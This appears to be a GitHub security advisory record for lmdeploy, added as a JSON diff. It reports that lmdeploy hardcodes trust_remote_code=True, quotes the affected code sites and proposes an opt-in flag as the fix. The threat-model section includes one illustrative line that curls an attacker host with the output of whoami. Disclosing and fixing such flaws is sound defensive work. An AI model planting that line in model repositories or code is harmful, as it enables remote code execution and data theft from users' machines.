@@ -1,0 +1,99 @@
+{
+  "id": "GHSA-9xq9-36w5-q796",
+  "modified": "2026-05-21T19:46:27.111361004Z",
+  "published": "2026-05-21T19:33:32Z",
+  "aliases": [
+    "CVE-2026-46517"
+  ],
+  "summary": "lmdeploy: Hardcoded trust_remote_code=True is an implicit unsafe remote-code load path with no user opt-out",
+  "details": "\u003e ## 📋 Reframing (2026-05-02): implicit unsafe remote-code path, not \"supply-chain\"\n\u003e\n\u003e The accurate description of this vulnerability is:\n\u003e **\"`get_model_arch` and related helpers hardcode `trust_remote_code=True`\n\u003e with no opt-out, creating an implicit unsafe remote-code load path\n\u003e on every model fetch.\"**\n\u003e\n\u003e What this report does NOT claim:\n\u003e * It is NOT a network-attack RCE — the user supplies the model\n\u003e   reference; LMDeploy honors it.\n\u003e * It is NOT a \"supply chain\" CVE in the classical sense (where a\n\u003e   benign upstream is compromised) — the user explicitly types the\n\u003e   repo name.\n\u003e\n\u003e What this report DOES claim:\n\u003e * Other inference frameworks (vLLM, TGI, Hugging Face transformers\n\u003e   itself) all expose `--trust-remote-code` as **opt-in** so that\n\u003e   users who consciously load known-safe repos can opt in, while\n\u003e   users following a tutorial cannot accidentally execute attacker\n\u003e   Python by typing a wrong repo name.\n\u003e * LMDeploy's hardcoded True is an **implicit** trust-boundary\n\u003e   override that violates HF Transformers' default-secure stance\n\u003e   (`trust_remote_code=False` since transformers ≥ 4.30).\n\u003e * The fix is a one-line CLI flag (`--trust-remote-code`) defaulting\n\u003e   False, threaded through the three sites, matching the rest of\n\u003e   the ecosystem.\n\u003e\n\u003e Severity should be assessed as **hardening / safe-by-default**,\n\u003e not as full unauthenticated RCE. CVSS revised to **5.5 Medium**\n\u003e (`AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` × user-must-load qualifier).\n\u003e\n\u003e Runtime evidence: see `12_lmdeploy_trust_remote_code_F13/runtime_evidence/cloudrun_cpu_verdict.txt`.\n\n---\n\n# F13 — LMDeploy: hardcoded `trust_remote_code=True` enables HF supply-chain RCE without user opt-in\n\n**Reporter:** ibondarenko1 / sactransport2000@gmail.com\n**Coordinated-disclosure window:** 90 days from initial vendor email.\n\n## TL;DR\n\nLMDeploy unilaterally passes `trust_remote_code=True` to\n`transformers.AutoConfig.from_pretrained()` (and several other\n`from_pretrained` callers) **regardless of any user opt-in**. The\nflag is hardcoded `True` in source — there is no CLI flag, no\nenvironment variable, no parameter, and no warning that lets a\nuser refuse remote code execution from the model repository.\nThis is a **silent override of HuggingFace Transformers' own\ndefault-secure stance** (`trust_remote_code=False`) introduced\nin HF Transformers ≥ 4.30 specifically to prevent this class of\nsupply-chain RCE.\n\nThe user running `lmdeploy serve api_server \u003cattacker_repo\u003e`,\n`lmdeploy lite calibrate \u003cattacker_repo\u003e`, etc. has **no way to\nopt out**. The only escape hatch is for the user to never load\nany third-party HF repo with LMDeploy — which is incompatible\nwith LMDeploy's documented use case.\n\nHuggingFace's `trust_remote_code=False` default exists exactly to\nprevent silent RCE when loading a third-party repo. LMDeploy overrides\nthis default, restoring the unsafe behaviour transparently. A malicious\nHF repo with a `configuration_*.py` shim runs Python code as the\nLMDeploy user at the very first call to `get_model_arch(...)`.\n\nThis is a documented anti-pattern (see HF Hub docs:\n\"Trusting custom code is therefore tricky...\"). Multiple peer\nprojects fixed similar issues — e.g. Hugging Face Transformers\nitself made this opt-in by default, and `vllm` exposes the flag\nthrough `--trust-remote-code` rather than hardcoding it.\n\n## Affected version\n\n* Repository: `github.com/InternLM/lmdeploy`, branch `main`.\n* Branch SHA at audit time: `9df0eff7c38ae69b9d4b9f7ad1441e484d439f92`\n  (2026-05-02).\n* Pinned blob SHAs:\n  * `lmdeploy/archs.py` → `68fa03a407734be1e2ae04098d34e9acdbe98262`\n  * `lmdeploy/lite/apis/calibrate.py` →\n    `0728304bdc3c03eee1d790bfbd5496df080a0ecd`\n  * `lmdeploy/lite/utils/load.py` →\n    `7c61677aa01e2d9881e32f8ca8ef6ad0f1d8b120`\n  * `lmdeploy/pytorch/check_env/model.py` →\n    `b1a2daaa426bf5fe25030f7913c703eed9f5b261`\n\nSnapshots of all four files are in `source_pinned/`.\n\n## Source-level evidence\n\n### Site 1 — architecture detection (every load goes through here)\n\n`lmdeploy/archs.py:147-157` — `get_model_arch`:\n```python\ndef get_model_arch(model_path: str):\n    \"\"\"Get a model's architecture and configuration.\"\"\"\n    try:\n        cfg = AutoConfig.from_pretrained(model_path, trust_remote_code=True)\n    except Exception as e:  # noqa\n        from transformers import PretrainedConfig\n        cfg = PretrainedConfig.from_pretrained(model_path, trust_remote_code=True)\n```\n\n**Both** the primary path and the fallback hardcode\n`trust_remote_code=True`. There is no parameter to override it. This\nfunction is called from every model-loading path in lmdeploy.\n\n### Site 2 — quantization CLI\n\n`lmdeploy/lite/apis/calibrate.py:248-251`:\n```python\ntokenizer = AutoTokenizer.from_pretrained(model, trust_remote_code=True)\n...\nmodel = load_hf_from_pretrained(model, dtype=dtype, trust_remote_code=True)\n```\n\n`lmdeploy lite calibrate \u003crepo\u003e` and downstream quant CLIs (gptq,\nawq) all flow through this. Hardcoded.\n\n### Site 3 — calibration helper\n\n`lmdeploy/lite/utils/load.py:55`:\n```python\ndef load_hf_from_pretrained(pretrained_model_name_or_path, dtype, **kwargs):\n    ...\n    hf_config = AutoConfig.from_pretrained(pretrained_model_name_or_path, trust_remote_code=True)\n```\n\nEven if the caller does not pass `trust_remote_code=True` in\n`**kwargs`, the helper internally hardcodes it on the config call\n(line 55), then loads the model on line 74. The config call alone is\nsufficient for RCE: HF Transformers downloads `configuration_*.py`\nfrom the repo and `import`s it whenever `trust_remote_code=True`.\n\n### Site 4 — pytorch engine check\n\n`lmdeploy/pytorch/check_env/model.py:10,99,234,242` —\n`trust_remote_code: bool = True` is the default value for the engine's\nparameter. Unlike the three sites above, this is \"default true\" not\n\"hardcoded true\" — a determined caller can pass False — but every\nshipped CLI passes True or relies on the default.\n\n### What `trust_remote_code=True` actually enables\n\nWhen `AutoConfig.from_pretrained(repo, trust_remote_code=True)` is\ncalled and the repo's `config.json` contains an `auto_map` key\npointing to a custom `configuration_\u003cname\u003e.py`:\n\n1. HF Transformers downloads the `.py` file from the repo.\n2. HF imports the module via `importlib`, **executing the file's\n   top-level code** (any `print`, `os.system`, `subprocess.run`,\n   `urllib.request.urlopen`, etc. fires now).\n3. HF then instantiates the named class.\n\nSo a malicious repo only needs a top-level\n`os.system(\"curl https://attacker/?$(whoami)\")` in\n`configuration_evil.py`. It runs as the lmdeploy process user.\n\n## Threat model\n\n**Attack surface.** Any user who runs an lmdeploy CLI command against\na HuggingFace repo identifier they did not personally vet. This\nincludes:\n\n* Casual users following a tutorial that says\n  `lmdeploy serve api_server \u003csome_repo\u003e`.\n* CI pipelines that automatically pull a model from HF Hub by\n  configuration (e.g. updates to a non-Pinned version tag).\n* Researchers comparing models from many authors. Even running\n  `lmdeploy lite calibrate` for benchmarking is enough.\n\nThe user is **not warned** that arbitrary Python from the repo will\nexecute, and there is **no flag** to disable it. The CVE class is\nCWE-94 (Improper Control of Generation of Code, supply-chain\nflavour) and CWE-915 (Improperly Controlled Modification of\nDynamically-Determined Object Attributes).\n\n## Comparison to peer projects\n\n| Project | trust_remote_code default | User control |\n|---|---|---|\n| HuggingFace Transformers | False | `trust_remote_code` keyword arg |\n| vLLM | False | `--trust-remote-code` flag |\n| **LMDeploy** | **True (hardcoded)** | **None** |\n| TGI | False | `--trust-remote-code` flag |\n\nLMDeploy is the outlier. The rationale is presumably \"internal\nmodels like InternLM need custom configuration_*.py\", but the fix is\nto accept a CLI flag like `--trust-remote-code` and default-False as\nthe rest of the ecosystem does.\n\n## Suggested fix\n\nReplace every hardcoded `trust_remote_code=True` with an explicit\nopt-in via CLI flag:\n\n```python\n# lmdeploy/archs.py — get_model_arch\ndef get_model_arch(model_path: str, trust_remote_code: bool = False):\n    try:\n        cfg = AutoConfig.from_pretrained(model_path, trust_remote_code=trust_remote_code)\n    except Exception as e:  # noqa\n        from transformers import PretrainedConfig\n        cfg = PretrainedConfig.from_pretrained(model_path, trust_remote_code=trust_remote_code)\n```\n\nWire `trust_remote_code` through every call site. Add `--trust-remote-code`\nto lmdeploy's CLI parser and forward it from server / calibrate /\ngptq / etc. **Default False**.\n\nA patch fragment is in `patch.diff`.\n\n## Disclosure plan\n\n1. Submit privately via lmdeploy security contact (typically email or\n   GitHub Security Advisory at\n   `https://github.com/InternLM/lmdeploy/security/advisories/new`).\n2. Reference Hugging Face Transformers' historical opt-out → opt-in\n   change as precedent for the fix shape.\n3. 90-day coordinated-disclosure window starting from acknowledgement.\n4. Request CVE through GHSA flow once the patch lands.\n\n## Why static-only is sufficient here\n\nUnlike F11 (RCE chain through `_load_pt_file`) which required a\nruntime PoC to demonstrate the pickle gadget execution, this finding\nis a **single trust-flag flip** — the behaviour of\n`AutoConfig.from_pretrained(repo, trust_remote_code=True)` on a HF\nrepo with a malicious `configuration_*.py` is documented behaviour of\nHF Transformers itself (their own docs warn against it). Reproducing\nit adds no new evidence; the static flag-state is the bug.\n\nIf the vendor requests a runtime PoC during triage we will provide\none (a malicious HF repo with `configuration_evil.py` + a one-liner\n`lmdeploy lite calibrate \u003crepo\u003e` invocation), but holding it back from\nthe initial advisory avoids publishing a working exploit during the\ndisclosure window.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "lmdeploy",
+        "purl": "pkg:pypi/lmdeploy"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.12.3"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.13",
+        "0.0.14",
+        "0.1.0",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.11.0",
+        "0.11.1",
+        "0.12.0",
+        "0.12.1",
+        "0.12.2",
+        "0.12.3",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.2.4",
+        "0.2.5",
+        "0.2.6",
+        "0.3.0",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.2.post1",
+        "0.5.3",
+        "0.6.0",
+        "0.6.0a0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.2.post1",
+        "0.6.3",
+        "0.6.4",
+        "0.6.5",
+        "0.7.0",
+        "0.7.0.post1",
+        "0.7.0.post2",
+        "0.7.0.post3",
+        "0.7.1",
+        "0.7.2",
+        "0.7.2.post1",
+        "0.7.3",
+        "0.8.0",
+        "0.9.0",
+        "0.9.1",
+        "0.9.2",
+        "0.9.2.post1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-9xq9-36w5-q796/GHSA-9xq9-36w5-q796.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/InternLM/lmdeploy/security/advisories/GHSA-9xq9-36w5-q796"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/InternLM/lmdeploy"
+    }
+  ]
+}
